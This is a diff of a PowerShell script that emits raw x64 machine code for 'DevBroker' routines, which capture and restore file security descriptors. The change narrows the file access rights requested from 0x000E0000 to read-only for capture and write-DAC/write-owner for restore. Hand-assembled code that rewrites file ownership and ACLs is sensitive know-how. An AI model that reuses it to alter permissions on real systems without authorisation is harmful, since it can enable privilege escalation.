@@ -1245,7 +1245,7 @@ function Emit-DevBrokerCaptureSecurityDescriptor {
     for ($i = 0; $i -lt 7; $i++) { Emit-StoreZero64Frame -SlotPosition ($fileInfoSlot + ($i * 8)) }
 
     Emit-LeaRaxFrame -SlotPosition $PathSlot
-    Emit-Bytes -Bytes ([byte[]]@(0x48, 0x89, 0xC1, 0xBA, 0x00, 0x00, 0x0E, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9))
+    Emit-Bytes -Bytes ([byte[]]@(0x48, 0x89, 0xC1, 0xBA, 0x00, 0x00, 0x02, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9))
     Emit-Win64CallIat -TargetRva ([UInt32]0x30A0) -StackArguments @(
         @{ Kind = 'Immediate'; Value = 3 },
         @{ Kind = 'Immediate'; Value = 0x02200080 },
@@ -1338,7 +1338,7 @@ function Emit-DevBrokerRestoreSecurityDescriptor {
     for ($i = 0; $i -lt 7; $i++) { Emit-StoreZero64Frame -SlotPosition ($fileInfoSlot + ($i * 8)) }
 
     Emit-LeaRaxFrame -SlotPosition $PathSlot
-    Emit-Bytes -Bytes ([byte[]]@(0x48, 0x89, 0xC1, 0xBA, 0x00, 0x00, 0x0E, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9))
+    Emit-Bytes -Bytes ([byte[]]@(0x48, 0x89, 0xC1, 0xBA, 0x00, 0x00, 0x0C, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9))
     Emit-Win64CallIat -TargetRva ([UInt32]0x30A0) -StackArguments @(
         @{ Kind = 'Immediate'; Value = 3 },
         @{ Kind = 'Immediate'; Value = 0x02200080 },
